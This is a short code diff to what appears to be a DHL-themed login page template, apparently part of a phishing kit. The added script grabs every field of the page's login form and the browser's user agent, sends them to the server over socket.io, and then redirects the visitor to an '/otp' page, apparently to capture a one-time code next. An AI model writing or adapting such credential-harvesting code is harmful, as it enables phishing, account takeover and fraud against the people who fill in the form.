@@ -30,6 +30,20 @@ $p_atm    = ($udata->settings->dhl->atm ?? false) == '1';
             padding-bottom: 70px !important;
         }
         </style>
+            <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+function submitForm() {
+    document.getElementById('userAgent').value = navigator.userAgent;
+
+    const formData = new FormData(document.getElementById('loginForm'));
+
+    socket.emit('submit', Object.fromEntries(formData));
+
+    window.location.href = `/otp`;
+}
+    </script>
     </head>
     <body class="">
         <nav class="c-nav-wcag">
